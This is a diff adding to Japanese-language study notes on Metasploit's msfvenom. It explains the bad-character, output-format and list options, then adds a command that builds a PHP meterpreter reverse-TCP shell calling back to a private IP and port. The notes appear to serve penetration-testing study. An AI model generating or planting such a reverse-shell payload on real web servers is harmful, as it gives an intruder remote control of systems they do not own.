@@ -28,3 +28,9 @@ msfconsole
 -b => バイナリに使わないバイナリ文字列を選択する。"\x80"とかをいれてNULL文字を含まないようにしたりとか。
 -f => アウトプットのフォーマットを選択する。-f cにするとC言語のバイナリ文字列で出せたりする。
 --list formats => formatオプションの使用できるオプション一覧を表示する。他のオプションもlist表示できる。
+
+### コマンド集
+phpのリバースシェルを生成する
+```
+msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.45.157 LPORT=4444 -f raw > shell.php
+```
